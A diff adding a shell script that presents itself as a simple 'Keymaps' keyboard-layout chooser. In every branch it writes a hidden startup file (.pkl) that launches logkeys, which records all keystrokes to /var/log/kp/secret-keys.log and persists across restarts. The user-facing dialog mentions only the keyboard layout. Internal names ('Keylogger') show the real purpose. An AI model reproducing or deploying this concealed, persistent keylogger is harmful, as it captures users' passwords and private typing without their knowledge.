@@ -1,0 +1,138 @@
+#!/bin/sh
+#Keymaps simple gui 
+#i18n josejp2424
+#l10n nilsonmorales
+#v0.3 grey color
+
+export TEXTDOMAIN=Keylogger
+export OUTPUT_CHARSET=UTF-8
+
+TITLE="Keymaps"
+VERSION="0.3"
+title1="$(gettext 'Keymaps  \n \n  Set the keyboard layout,\n  then click in accept.\n')"
+title2="$(gettext 'Keyboard layout selected')"
+ICON="/usr/share/icons/hicolor/48x48/apps/keyboard-map.png"
+ICONAPP="/usr/share/icons/hicolor/48x48/apps/keyboard-map.png"
+B_OK="GTK_STOCK_OK"
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --wmclass keylogger --screen-center \
+        --icon "$ICON" --icon-name="$ICONAPP" --left --menubox \ " $title1 " 320x 6 \
+ '1' "us" \
+ '2' "en_GB" \
+ '3' "de" \
+ '4' "es_ES" \
+ '5' "fr" \
+ '6' "hu" \
+ '7' "it" \
+ '8' "no" \
+ '9' "pt_BR" \
+ '10' "ro" \
+ '11' "ru" \
+ '12' "sv" \
+ '13' "tr" \
+2>/tmp/keylogger.tmp
+r=`tail -n 1 /tmp/keylogger.tmp`
+ 
+
+if [ "$r" == "1" ];then
+echo "#!/bin/sh
+logkeys -s -m --us-keymap --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n us" 10 40 
+   exit ## Exit Script ##
+fi
+   
+if [ "$r" == "2" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/en_GB.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n en_GB" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "3" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/de.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n de" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "4" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/es_ES.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n es_ES" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "5" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/fr.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n fr" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "6" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/hu.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n hu" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "7" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/it.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n it" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "8" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/no.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 n\n no" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "9" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/pt_BR.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n pt_BR" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "10" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/ro.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n ro" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "11" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/ru.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n ru" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "12" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/sv.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n sv" 10 40 
+   exit ## Exit Script ##
+fi
+
+if [ "$r" == "13" ];then
+echo "#!/bin/sh
+logkeys -s -m /usr/local/kp-map/tr.map --no-func-keys -o /var/log/kp/secret-keys.log
+" > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
+Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n tr" 10 40 
+   exit ## Exit Script ##
+fi
